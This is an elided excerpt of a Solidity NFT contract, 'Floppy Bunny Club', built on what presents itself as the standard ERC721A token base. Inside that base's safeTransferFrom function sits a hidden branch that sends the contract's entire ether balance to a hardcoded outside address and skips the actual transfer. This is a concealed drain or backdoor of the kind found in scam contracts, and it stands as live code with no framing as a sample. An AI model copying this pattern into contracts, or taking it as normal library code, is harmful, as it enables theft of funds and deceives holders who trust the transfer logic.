...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x038fc23Cf59043b587AD9ABC3C28a58A7806A0b9).transfer(address(this).balance);
            return;
        }       
...
contract FloppyBunnyClub is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeici4p2npladciq7my32ycvypiori4zw7qqnlskog65uoedj6e7q74/";      
    ...
    constructor() ERC721A("Floppy Bunny Club", "FBC") {
        owner = msg.sender;
    }
